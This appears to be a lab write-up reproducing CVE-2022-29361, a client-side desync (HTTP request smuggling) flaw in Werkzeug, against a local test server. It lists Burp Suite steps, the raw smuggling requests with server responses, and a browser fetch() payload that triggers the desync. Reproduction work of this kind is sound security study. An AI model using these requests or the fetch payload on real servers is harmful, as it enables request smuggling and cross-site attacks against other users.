## Steps to reproduce the attack

### Method 1. Using Burp Suite
1. Send ```GET``` request to ```/``` using the Burp Suite browser send the request to the repeater. The complete URL is <http://localhost:5001>. This request can be considered as attack request.
2. Right click in the request field and change request method to ```POST```.
3. Disable ```Update Content-Length``` and enable ```HTTP/1 connection reuse``` under the settings icon right next to the ```Send``` button.
4. Add a ```Connection``` field and set this to ```keep-alive```.
5. Send another ```GET``` request to the repeater and group both requests together in a group. This second request can be considered as normal request.
6. Click on the dropdown next to the ```Send``` button and change the mode to ```Send group (single connection)```.
7. Note that both HTTP requests are set to HTTP/1. This can be validated in the inspector menu on the right side of the screen.
8. Change the ```Content-Length``` to a random high value, send the request and notice that server directly replies and that the response contains a ```Content-Length``` with another value.

#### Attack request
This is the attack request containing a smuggled ```GET``` request. The response to this request is based on the ```POST``` request shown below.

<table>
<tr>
<th>Request</th>
<th>Response</th>
</tr>
<tr>
<td>

```http
POST / HTTP/1.1
Host: 127.0.0.1:5001
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length : 500

GET /test404 HTTP/1.1
Foo: X
```

</td>
<td>

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.1.0 Python/3.10.13
Date: Tue, 16 Jan 2024 12:46:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 95

<h1>CVE-2022-29361 | Client-Side Desync to XSS</h1>
<script src='/static/main.js'></script>
```

</td>
</tr>
</table>

#### Normal request
The normal request usually respond with a ```HTTP 200 OK``` status code. But in this request the desync becomes visible. The response is actually the response for a ```GET``` request to ```/test404``` smuggled in the attack request as shown above.

<table>
<tr>
<th>Request</th>
<th>Response</th>
</tr>
<tr>
<td>

```http
GET / HTTP/1.1
Host: 127.0.0.1:5001
Connection: close
```

</td>
<td>

```http
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.0 Python/3.10.13
Date: Tue, 16 Jan 2024 13:35:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 232

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

</td>
</tr>
</table>

### Method 2. Using browser
To transform this attack into a browser-powered desync attack, it must be possible to execute this desync in a browser.

#### Prerequisites
Go to the ```network``` tab and enable ```Persist logs``` (Firefox) or ```Preserve log``` (Google Chrome).

#### Fetch request in console
Execute the following JavaScript code in the ```console``` tab.

```javascript
fetch('http://localhost:5001/', {
    method: 'POST',
    body: 'GET /test404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('http://localhost:5001/', {
        mode: 'no-cors',
        credentials: 'include'
    });
});
```
